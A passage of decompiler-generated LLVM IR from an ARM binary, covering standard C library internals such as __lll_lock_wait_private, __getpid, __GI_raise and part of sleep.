  %v1_13c48 = add i32 %v0_13c24, 4
  %v2_13c48 = inttoptr i32 %v1_13c48 to i32*
  %v3_13c48 = load i32, i32* %v2_13c48, align 4
  store i32 %v3_13c48, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_13c4c = icmp eq i32 %v3_13c48, 0
  br i1 %v2_13c4c, label %dec_label_pc_13c54, label %dec_label_pc_13bc0

dec_label_pc_13c4cthread-pre-split:               ; preds = %dec_label_pc_13ba4, %dec_label_pc_13b9c, %dec_label_pc_13b3c
  %v0_13c4c.pr = load i32, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_13c4c11 = icmp eq i32 %v0_13c4c.pr, 0
  br i1 %v2_13c4c11, label %dec_label_pc_13c54, label %dec_label_pc_13bc0

dec_label_pc_13c54:                               ; preds = %dec_label_pc_13c48, %dec_label_pc_13c4cthread-pre-split
  %v0_13c54.pre = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_13c54.pre, i32* %r0.global-to-local, align 4
  ret i32 %v0_13c54.pre

; uselistorder directives
  uselistorder i32 %v0_13c4c.pr, { 1, 0 }
  uselistorder i32 %v3_13c48, { 1, 2, 0 }
  uselistorder i32 %v1_13c10, { 1, 0, 2, 3 }
  uselistorder i32 %v0_13c0c, { 1, 0, 2 }
  uselistorder i32 %v1_13bf0.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_13b90, { 1, 0, 2 }
  uselistorder i32 %v1_13b74.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_13b64, { 1, 0 }
  uselistorder i32 %v0_13a08, { 1, 0, 2 }
  uselistorder i32 %v1_139ec.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v4_139c4, { 2, 1, 0, 3 }
  uselistorder i32 %v0_1399c, { 1, 0, 2 }
  uselistorder i32 %v1_13980.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v2_13948, { 1, 0, 2 }
  uselistorder i32 %v0_13928, { 1, 0, 2 }
  uselistorder i32 %v1_1390c.pre, { 0, 3, 2, 1 }
  uselistorder i32* %r8.global-to-local, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32* %r7.global-to-local, { 14, 0, 1, 2, 3, 5, 4, 6, 7, 8, 10, 11, 9, 12, 13 }
  uselistorder i32* %r6.global-to-local, { 3, 7, 5, 6, 4, 0, 1, 2 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 3, 2, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2, 4, 3, 5, 6, 8, 7, 9, 10, 12, 11, 13, 14, 16, 15, 17 }
  uselistorder i32* %r3.global-to-local, { 34, 1, 2, 4, 3, 0, 5, 6, 7, 8, 10, 9, 30, 11, 12, 13, 14, 15, 16, 17, 19, 18, 31, 20, 21, 22, 24, 23, 32, 25, 26, 28, 27, 33, 29 }
  uselistorder i32* %r0.global-to-local, { 12, 13, 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 9, 10 }
  uselistorder i1* %cpsr_c.global-to-local, { 29, 5, 0, 1, 2, 3, 21, 22, 4, 6, 7, 8, 23, 24, 9, 10, 11, 25, 26, 12, 13, 14, 27, 28, 15, 16, 17, 18, 31, 32, 20, 19, 30 }
  uselistorder i32 108, { 4, 5, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_13c54, { 1, 0 }
  uselistorder label %dec_label_pc_13c48, { 1, 2, 0 }
  uselistorder label %dec_label_pc_13c10, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13bf8, { 1, 0 }
  uselistorder label %bb76, { 1, 0 }
  uselistorder label %dec_label_pc_13b94, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13b7c, { 1, 0 }
  uselistorder label %bb74, { 1, 0 }
  uselistorder label %dec_label_pc_13a0c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_139f4, { 1, 0 }
  uselistorder label %dec_label_pc_139a0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13988, { 1, 0 }
  uselistorder label %bb72, { 1, 0 }
  uselistorder label %dec_label_pc_1392c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13914, { 1, 0 }
  uselistorder label %dec_label_pc_139b0.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_138e0, { 1, 0 }
}

define i32 @__lll_lock_wait_private(i32* %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_13c8c = load i32, i32* @r4, align 4
  store i32 %v3_13c8c, i32* %stack_var_-16, align 4
  %v0_13c90 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_13c90, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_13c94

dec_label_pc_13c94:                               ; preds = %dec_label_pc_13d14.dec_label_pc_13c94_crit_edge, %entry
  %v0_13c98 = phi i32 [ %v0_13c98.pre, %dec_label_pc_13d14.dec_label_pc_13c94_crit_edge ], [ %v0_13c90, %entry ]
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 %v0_13c98, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r4.global-to-local, align 4
  %v1_13ca017 = inttoptr i32 %v0_13c98 to i32*
  %v2_13ca018 = load i32, i32* %v1_13ca017, align 4
  %v3_13ca420 = icmp ne i32 %v2_13ca018, 0
  store i1 %v3_13ca420, i1* %cpsr_c.global-to-local, align 1
  %v9_13ca426 = icmp eq i32 %v2_13ca018, 1
  br i1 %v9_13ca426, label %dec_label_pc_13cac, label %dec_label_pc_13cc4

dec_label_pc_13cac:                               ; preds = %dec_label_pc_13c94, %dec_label_pc_13cac.dec_label_pc_13ca0_crit_edge
  %v0_13cac27 = phi i32 [ %v1_13ca4.pre, %dec_label_pc_13cac.dec_label_pc_13ca0_crit_edge ], [ 1, %dec_label_pc_13c94 ]
  store i32 %v0_13cac27, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_13cbc = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_13cbc, label %dec_label_pc_13cc0, label %dec_label_pc_13cac.dec_label_pc_13ca0_crit_edge

dec_label_pc_13cac.dec_label_pc_13ca0_crit_edge:  ; preds = %dec_label_pc_13cac
  %v0_13ca0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_13ca4.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_13ca0 = inttoptr i32 %v0_13ca0.pre to i32*
  %v2_13ca0 = load i32, i32* %v1_13ca0, align 4
  %v3_13ca4 = icmp uge i32 %v2_13ca0, %v1_13ca4.pre
  store i1 %v3_13ca4, i1* %cpsr_c.global-to-local, align 1
  %v9_13ca4 = icmp eq i32 %v2_13ca0, %v1_13ca4.pre
  br i1 %v9_13ca4, label %dec_label_pc_13cac, label %dec_label_pc_13cc4

dec_label_pc_13cc0:                               ; preds = %dec_label_pc_13cac
  %v0_13cc0 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13cc4

dec_label_pc_13cc4:                               ; preds = %dec_label_pc_13c94, %dec_label_pc_13cac.dec_label_pc_13ca0_crit_edge, %dec_label_pc_13cc0
  %v0_13cc4 = phi i32 [ %v0_13cc0, %dec_label_pc_13cc0 ], [ %v2_13ca018, %dec_label_pc_13c94 ], [ %v2_13ca0, %dec_label_pc_13cac.dec_label_pc_13ca0_crit_edge ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_13cc4 = icmp eq i32 %v0_13cc4, 0
  %v0_13ce8.pre = load i32, i32* %r5.global-to-local, align 4
  br i1 %v2_13cc4, label %dec_label_pc_13ce4, label %dec_label_pc_13ccc

dec_label_pc_13ccc:                               ; preds = %dec_label_pc_13cc4
  store i32 %v0_13ce8.pre, i32* %r0.global-to-local, align 4
  %v0_13cd0 = load i32, i32* %r1.global-to-local, align 4
  %v1_13cd0 = add i32 %v0_13cd0, 126
  store i32 %v1_13cd0, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13ce4

dec_label_pc_13ce4:                               ; preds = %dec_label_pc_13cc4, %dec_label_pc_13ccc
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 %v0_13ce8.pre, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_13cf028 = inttoptr i32 %v0_13ce8.pre to i32*
  %v2_13cf029 = load i32, i32* %v1_13cf028, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_13cf436 = icmp eq i32 %v2_13cf029, 0
  br i1 %v9_13cf436, label %dec_label_pc_13cfc, label %dec_label_pc_13d14

dec_label_pc_13cfc:                               ; preds = %dec_label_pc_13ce4, %dec_label_pc_13cfc.dec_label_pc_13cf0_crit_edge
  %v0_13cfc37 = phi i32 [ %v1_13cf4.pre, %dec_label_pc_13cfc.dec_label_pc_13cf0_crit_edge ], [ 0, %dec_label_pc_13ce4 ]
  store i32 %v0_13cfc37, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_13d0c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_13d0c, label %dec_label_pc_13d10, label %dec_label_pc_13cfc.dec_label_pc_13cf0_crit_edge

dec_label_pc_13cfc.dec_label_pc_13cf0_crit_edge:  ; preds = %dec_label_pc_13cfc
  %v0_13cf0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_13cf4.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_13cf0 = inttoptr i32 %v0_13cf0.pre to i32*
  %v2_13cf0 = load i32, i32* %v1_13cf0, align 4
  %v3_13cf4 = icmp uge i32 %v2_13cf0, %v1_13cf4.pre
  store i1 %v3_13cf4, i1* %cpsr_c.global-to-local, align 1
  %v9_13cf4 = icmp eq i32 %v2_13cf0, %v1_13cf4.pre
  br i1 %v9_13cf4, label %dec_label_pc_13cfc, label %dec_label_pc_13d14

dec_label_pc_13d10:                               ; preds = %dec_label_pc_13cfc
  %v0_13d10 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13d14

dec_label_pc_13d14:                               ; preds = %dec_label_pc_13ce4, %dec_label_pc_13cfc.dec_label_pc_13cf0_crit_edge, %dec_label_pc_13d10
  %v0_13d14 = phi i32 [ %v0_13d10, %dec_label_pc_13d10 ], [ %v2_13cf029, %dec_label_pc_13ce4 ], [ %v2_13cf0, %dec_label_pc_13cfc.dec_label_pc_13cf0_crit_edge ]
  %v1_13d14 = phi i32 [ %v0_13d10, %dec_label_pc_13d10 ], [ 0, %dec_label_pc_13ce4 ], [ %v1_13cf4.pre, %dec_label_pc_13cfc.dec_label_pc_13cf0_crit_edge ]
  %v3_13d14 = icmp uge i32 %v0_13d14, %v1_13d14
  store i1 %v3_13d14, i1* %cpsr_c.global-to-local, align 1
  %v9_13d14 = icmp eq i32 %v0_13d14, %v1_13d14
  br i1 %v9_13d14, label %dec_label_pc_13d1c, label %dec_label_pc_13d14.dec_label_pc_13c94_crit_edge

dec_label_pc_13d14.dec_label_pc_13c94_crit_edge:  ; preds = %dec_label_pc_13d14
  %v0_13c98.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_13c94

dec_label_pc_13d1c:                               ; preds = %dec_label_pc_13d14
  %v2_13d1c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_13d1c, i32* %r4.global-to-local, align 4
  %v1_13d20 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_13d20

; uselistorder directives
  uselistorder i32 %v0_13d10, { 1, 0 }
  uselistorder i32 %v1_13cf4.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_13ca4.pre, { 2, 1, 0 }
  uselistorder i32 %v2_13ca018, { 0, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 3, 5, 0, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 2, 4, 3, 1, 5, 7, 6, 0 }
  uselistorder i32 126, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13d14, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13cfc, { 1, 0 }
  uselistorder label %dec_label_pc_13ce4, { 1, 0 }
  uselistorder label %dec_label_pc_13cc4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13cac, { 1, 0 }
}

define i32 @__getpid(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13d24 = load i32, i32* @r7, align 4
  store i32 %v3_13d24, i32* %stack_var_-8, align 4
  %v0_13d28 = call i32 @__aeabi_read_tp()
  store i32 %v0_13d28, i32* %r0.global-to-local, align 4
  %v1_13d2c = add i32 %v0_13d28, -1060
  %v2_13d2c = inttoptr i32 %v1_13d2c to i32*
  %v3_13d2c = load i32, i32* %v2_13d2c, align 4
  %tmp7 = icmp slt i32 %v3_13d2c, 1
  br i1 %tmp7, label %dec_label_pc_13d3c, label %dec_label_pc_13d60

dec_label_pc_13d3c:                               ; preds = %entry
  %v2_13d30 = icmp eq i32 %v3_13d2c, 0
  br i1 %v2_13d30, label %dec_label_pc_13d40, label %dec_label_pc_13d4c

dec_label_pc_13d40:                               ; preds = %dec_label_pc_13d3c
  %v1_13d40 = add i32 %v0_13d28, -1064
  %v2_13d40 = inttoptr i32 %v1_13d40 to i32*
  %v3_13d40 = load i32, i32* %v2_13d40, align 4
  store i32 %v3_13d40, i32* %r0.global-to-local, align 4
  %v2_13d44 = icmp eq i32 %v3_13d40, 0
  br i1 %v2_13d44, label %bb, label %bb8

dec_label_pc_13d4c:                               ; preds = %dec_label_pc_13d3c
  br label %bb8

bb:                                               ; preds = %dec_label_pc_13d40
  store i32 0, i32* %v2_13d40, align 4
  %v0_13d5c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb8

bb8:                                              ; preds = %dec_label_pc_13d4c, %dec_label_pc_13d40, %bb
  %v0_13d5c = phi i32 [ %v3_13d40, %dec_label_pc_13d40 ], [ %v0_13d28, %dec_label_pc_13d4c ], [ %v0_13d5c.pre, %bb ]
  br label %dec_label_pc_13d60

dec_label_pc_13d60:                               ; preds = %entry, %bb8
  %v0_13d60 = phi i32 [ %v3_13d2c, %entry ], [ %v0_13d5c, %bb8 ]
  store i32 %v0_13d60, i32* %r0.global-to-local, align 4
  %v2_13d64 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13d64, i32* @r7, align 4
  ret i32 %v0_13d60

; uselistorder directives
  uselistorder i32 %v0_13d60, { 1, 0 }
  uselistorder i32 %v3_13d2c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_13d60, { 1, 0 }
  uselistorder label %bb8, { 2, 0, 1 }
}

define i32 @__GI_raise(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_13d6c = load i32, i32* @r4, align 4
  store i32 %v3_13d6c, i32* %stack_var_-20, align 4
  %v0_13d74 = call i32 @__aeabi_read_tp()
  store i32 %v0_13d74, i32* %r0.global-to-local, align 4
  %v1_13d78 = add i32 %v0_13d74, -1064
  %v2_13d78 = inttoptr i32 %v1_13d78 to i32*
  %v3_13d78 = load i32, i32* %v2_13d78, align 4
  store i32 %v3_13d78, i32* %r4.global-to-local, align 4
  %v2_13d7c = icmp eq i32 %v3_13d78, 0
  %v1_13d84 = add i32 %v0_13d74, -1060
  %v2_13d84 = inttoptr i32 %v1_13d84 to i32*
  %v3_13d84 = load i32, i32* %v2_13d84, align 4
  store i32 %v3_13d84, i32* %r0.global-to-local, align 4
  br i1 %v2_13d7c, label %dec_label_pc_13d8c, label %dec_label_pc_13da0

dec_label_pc_13d8c:                               ; preds = %entry
  store i32 %v3_13d84, i32* %r4.global-to-local, align 4
  store i32 %v3_13d84, i32* %v2_13d78, align 4
  %v0_13dc8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb28

dec_label_pc_13da0:                               ; preds = %entry
  %v5_13da4 = icmp sgt i32 %v3_13d84, 0
  br i1 %v5_13da4, label %bb28, label %dec_label_pc_13da8

dec_label_pc_13da8:                               ; preds = %dec_label_pc_13da0
  %tmp = bitcast i32 %v3_13d84 to float
  %tmp30 = call float @fabsf(float %tmp)
  %v1_13da8 = bitcast float %tmp30 to i32
  %v2_13dac = icmp eq i32 %v1_13da8, 0
  br i1 %v2_13dac, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_13da8
  store i32 %v3_13d78, i32* %r0.global-to-local, align 4
  br label %bb28

.thread:                                          ; preds = %dec_label_pc_13da8
  %v2_13db4 = sub i32 0, %v3_13d84
  store i32 %v2_13db4, i32* %r0.global-to-local, align 4
  br label %bb28

bb28:                                             ; preds = %bb, %dec_label_pc_13da0, %dec_label_pc_13d8c, %.thread
  %v0_13dcc = phi i32 [ %v3_13d84, %dec_label_pc_13da0 ], [ %v0_13dc8.pre, %dec_label_pc_13d8c ], [ %v3_13d78, %bb ], [ %v2_13db4, %.thread ]
  store i32 %v0_13dcc, i32* %r2.global-to-local, align 4
  %tmp31 = icmp ult i32 %v0_13dcc, -4095
  br i1 %tmp31, label %dec_label_pc_13df0, label %dec_label_pc_13dd8

dec_label_pc_13dd8:                               ; preds = %bb28
  %v0_13ddc = call i32 @__aeabi_read_tp()
  %v3_13de0 = load i16, i16* @global_var_216ec.303, align 2
  %v4_13de0 = sext i16 %v3_13de0 to i32
  %v0_13de4 = load i32, i32* %r2.global-to-local, align 4
  %v1_13de4 = sub i32 0, %v0_13de4
  store i32 %v1_13de4, i32* %r2.global-to-local, align 4
  %v3_13de8 = add i32 %v4_13de0, %v0_13ddc
  %v4_13de8 = inttoptr i32 %v3_13de8 to i32*
  store i32 %v1_13de4, i32* %v4_13de8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13df0

dec_label_pc_13df0:                               ; preds = %bb28, %dec_label_pc_13dd8
  %v0_13df4 = phi i32 [ %v0_13dcc, %bb28 ], [ -1, %dec_label_pc_13dd8 ]
  %v3_13df0 = icmp eq i32 %v0_13df4, -1
  store i32 %v0_13df4, i32* %r5.global-to-local, align 4
  br i1 %v3_13df0, label %dec_label_pc_13dfc, label %dec_label_pc_13e44

dec_label_pc_13dfc:                               ; preds = %dec_label_pc_13df0
  %v0_13e00 = call i32 @__aeabi_read_tp()
  store i32 %v0_13e00, i32* %r0.global-to-local, align 4
  %v3_13e04 = load i16, i16* @global_var_216ec.303, align 2
  %v4_13e04 = sext i16 %v3_13e04 to i32
  %v2_13e08 = add i32 %v4_13e04, %v0_13e00
  %v3_13e08 = inttoptr i32 %v2_13e08 to i32*
  %v4_13e08 = load i32, i32* %v3_13e08, align 4
  %v7_13e0c = icmp eq i32 %v4_13e08, 38
  br i1 %v7_13e0c, label %dec_label_pc_13e18, label %dec_label_pc_13dfc.dec_label_pc_13e44_crit_edge

dec_label_pc_13dfc.dec_label_pc_13e44_crit_edge:  ; preds = %dec_label_pc_13dfc
  %v0_13e44.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_13e44

dec_label_pc_13e18:                               ; preds = %dec_label_pc_13dfc
  %v0_13e18 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_13e18, i32* %r0.global-to-local, align 4
  %tmp32 = icmp ugt i32 %v0_13e18, -4096
  br i1 %tmp32, label %bb29, label %.thread22

bb29:                                             ; preds = %dec_label_pc_13e18
  %v5_13e30 = sub i32 0, %v0_13e18
  store i32 %v5_13e30, i32* %r2.global-to-local, align 4
  %v7_13e34 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_13e3c.480 to i32), i32 55472) to i32*), align 4
  %v4_13e38 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v4_13e38, i32* %r0.global-to-local, align 4
  %v7_13e3c = add i32 %v7_13e34, %v0_13e00
  %v8_13e3c = inttoptr i32 %v7_13e3c to i32*
  store i32 %v5_13e30, i32* %v8_13e3c, align 4
  %v0_13e40.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread22

.thread22:                                        ; preds = %dec_label_pc_13e18, %bb29
  %v0_13e40 = phi i32 [ %v0_13e40.pre, %bb29 ], [ %v0_13e18, %dec_label_pc_13e18 ]
  store i32 %v0_13e40, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_13e44

dec_label_pc_13e44:                               ; preds = %dec_label_pc_13dfc.dec_label_pc_13e44_crit_edge, %dec_label_pc_13df0, %.thread22
  %v0_13e44 = phi i32 [ %v0_13e44.pre, %dec_label_pc_13dfc.dec_label_pc_13e44_crit_edge ], [ %v0_13df4, %dec_label_pc_13df0 ], [ %v0_13e40, %.thread22 ]
  store i32 %v0_13e44, i32* %r0.global-to-local, align 4
  %v2_13e48 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_13e48, i32* @r4, align 4
  ret i32 %v0_13e44

; uselistorder directives
  uselistorder i32 %v0_13e44, { 1, 0 }
  uselistorder i32 %v0_13e18, { 1, 2, 0, 3 }
  uselistorder i32 %v0_13dcc, { 2, 0, 1 }
  uselistorder i32 %v3_13d84, { 2, 1, 0, 5, 4, 3, 6 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 11, 0 }
  uselistorder i32 38, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 -1060, { 1, 0 }
  uselistorder i32 -1064, { 1, 0 }
  uselistorder label %dec_label_pc_13e44, { 2, 0, 1 }
  uselistorder label %.thread22, { 1, 0 }
  uselistorder label %dec_label_pc_13df0, { 1, 0 }
  uselistorder label %bb28, { 3, 0, 1, 2 }
}

define i32 @sleep(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %v3_13e5c = load i32, i32* @r4, align 4
  %v6_13e5c = load i32, i32* @r5, align 4
  %v9_13e5c = load i32, i32* @r6, align 4
  %v12_13e5c = load i32, i32* @r7, align 4
  %v15_13e5c = load i32, i32* @lr, align 4
  store i32 0, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_13e6c = icmp eq i32 %arg1, 0
  store i32 ptrtoint (i32* @global_var_21694.308 to i32), i32* @r7, align 4
  store i32 %arg1, i32* %stack_var_-32, align 4
  br i1 %v2_13e6c, label %dec_label_pc_13e80, label %dec_label_pc_13ef4

dec_label_pc_13e80:                               ; preds = %entry
  %v0_13e80 = call i32 @__aeabi_read_tp()
  %v1_13e84 = add i32 %v0_13e80, -1036
  %v2_13e84 = inttoptr i32 %v1_13e84 to i32*
  %v3_13e84 = load i32, i32* %v2_13e84, align 4
  %v1_13e88 = and i32 %v3_13e84, -71
  %v2_13e8c = icmp ugt i32 %v1_13e88, 7
  store i1 %v2_13e8c, i1* %cpsr_c.global-to-local, align 1
  %v7_13e8c = icmp eq i32 %v1_13e88, 8
  %v1_13e90 = add i32 %v0_13e80, -1168
  store i32 %v1_13e90, i32* @r5, align 4
  br i1 %v7_13e8c, label %dec_label_pc_13e98, label %dec_label_pc_13f6c

dec_label_pc_13e98:                               ; preds = %dec_label_pc_13e80
  %v2_13e9c = add i32 %v0_13e80, -624
  %v3_13e9c = inttoptr i32 %v2_13e9c to i32*
  store i32 -1, i32* %v3_13e9c, align 4
  %v0_13ea0 = load i32, i32* @r5, align 4
  %v1_13ea0 = add i32 %v0_13ea0, 132
  store i32 %v1_13ea0, i32* @r6, align 4
  br label %dec_label_pc_13ea4

dec_label_pc_13ea4:                               ; preds = %dec_label_pc_13ed8.dec_label_pc_13ea4_crit_edge, %dec_label_pc_13e98
  %v0_13ea8 = phi i32 [ %v0_13ea8.pre, %dec_label_pc_13ed8.dec_label_pc_13ea4_crit_edge ], [ %v1_13ea0, %dec_label_pc_13e98 ]
  %v0_13ea4 = phi i32 [ %v0_13ee0, %dec_label_pc_13ed8.dec_label_pc_13ea4_crit_edge ], [ %v0_13ea0, %dec_label_pc_13e98 ]
  %v1_13ea4 = add i32 %v0_13ea4, 132
  %v2_13ea4 = inttoptr i32 %v1_13ea4 to i32*
  %v3_13ea4 = load i32, i32* %v2_13ea4, align 4
  store i32 %v0_13ea8, i32* %r2.global-to-local, align 4
  store i32 %v3_13ea4, i32* @r4, align 4
  %v1_13eb430 = inttoptr i32 %v0_13ea8 to i32*
  %v2_13eb431 = load i32, i32* %v1_13eb430, align 4
  %v3_13eb833 = icmp uge i32 %v2_13eb431, %v3_13ea4
  store i1 %v3_13eb833, i1* %cpsr_c.global-to-local, align 1
  %v9_13eb839 = icmp eq i32 %v2_13eb431, %v3_13ea4
  br i1 %v9_13eb839, label %dec_label_pc_13ec0, label %dec_label_pc_13ed8

dec_label_pc_13ec0:                               ; preds = %dec_label_pc_13ea4, %dec_label_pc_13ec0.dec_label_pc_13eb4_crit_edge
  call void @__pseudo_branch(i32 -61504)
  %v0_13ed0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_13ed0, label %dec_label_pc_13ed4, label %dec_label_pc_13ec0.dec_label_pc_13eb4_crit_edge

dec_label_pc_13ec0.dec_label_pc_13eb4_crit_edge:  ; preds = %dec_label_pc_13ec0
  %v0_13eb4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_13eb8.pre = load i32, i32* @r4, align 4
  %v1_13eb4 = inttoptr i32 %v0_13eb4.pre to i32*
  %v2_13eb4 = load i32, i32* %v1_13eb4, align 4
  %v3_13eb8 = icmp uge i32 %v2_13eb4, %v1_13eb8.pre
  store i1 %v3_13eb8, i1* %cpsr_c.global-to-local, align 1
  %v9_13eb8 = icmp eq i32 %v2_13eb4, %v1_13eb8.pre
  br i1 %v9_13eb8, label %dec_label_pc_13ec0, label %dec_label_pc_13ed8

dec_label_pc_13ed4:                               ; preds = %dec_label_pc_13ec0
  %v0_13ed4 = load i32, i32* @r4, align 4
  br label %dec_label_pc_13ed8

dec_label_pc_13ed8:                               ; preds = %dec_label_pc_13ea4, %dec_label_pc_13ec0.dec_label_pc_13eb4_crit_edge, %dec_label_pc_13ed4
  %v0_13ed8 = phi i32 [ %v0_13ed4, %dec_label_pc_13ed4 ], [ %v2_13eb431, %dec_label_pc_13ea4 ], [ %v2_13eb4, %dec_label_pc_13ec0.dec_label_pc_13eb4_crit_edge ]
  %v1_13ed8 = phi i32 [ %v0_13ed4, %dec_label_pc_13ed4 ], [ %v3_13ea4, %dec_label_pc_13ea4 ], [ %v1_13eb8.pre, %dec_label_pc_13ec0.dec_label_pc_13eb4_crit_edge ]
  %v3_13ed8 = icmp uge i32 %v0_13ed8, %v1_13ed8
  store i1 %v3_13ed8, i1* %cpsr_c.global-to-local, align 1
  %v9_13ed8 = icmp eq i32 %v0_13ed8, %v1_13ed8
  br i1 %v9_13ed8, label %dec_label_pc_13ee0, label %dec_label_pc_13ed8.dec_label_pc_13ea4_crit_edge

dec_label_pc_13ed8.dec_label_pc_13ea4_crit_edge:  ; preds = %dec_label_pc_13ed8
  %v0_13ee0 = load i32, i32* @r5, align 4
  %v0_13ea8.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_13ea4

dec_label_pc_13ee0:                               ; preds = %dec_label_pc_13ed8
  %v0_13ee8 = load i32, i32* @r7, align 4
  %v2_13ee8 = add i32 %v0_13ee8, 116
  %v3_13ee8 = inttoptr i32 %v2_13ee8 to i32*
  %v4_13ee8 = load i32, i32* %v3_13ee8, align 4
  store i32 81652, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_13ee8)
  %v0_13efc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_13ef4

dec_label_pc_13ef4:                               ; preds = %entry, %dec_label_pc_13ee0
  %v0_13efc = phi i32 [ 0, %entry ], [ %v0_13efc.pre, %dec_label_pc_13ee0 ]
  %v2_13f00 = ptrtoint i32* %stack_var_-60 to i32
  store i32 %v2_13f00, i32* %r2.global-to-local, align 4
  store i32 65536, i32* %stack_var_-40, align 4
  %v3_13f0c = call i32 @__libc_sigaction(i32 17, i32 %v0_13efc, i32 %v2_13f00)
  %v3_13f10 = load i32, i32* %stack_var_-60, align 4
  %v2_13f14 = icmp ne i32 %v3_13f10, 0
  store i1 %v2_13f14, i1* %cpsr_c.global-to-local, align 1
  %v7_13f14 = icmp eq i32 %v3_13f10, 1
  br i1 %v7_13f14, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_13ef4
  %v3_13f18 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v3_13f18, i32* %r2.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_13ef4, %bb
  call void @__pseudo_cond_branch(i1 %v7_13f14, i32 ptrtoint (i32* @global_var_10c28.484 to i32))
  %v2_13f28 = ptrtoint i32* %stack_var_-32 to i32
  %v2_13f30 = call i32 @__libc_nanosleep(i32 %v2_13f28, i32 %v2_13f28)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
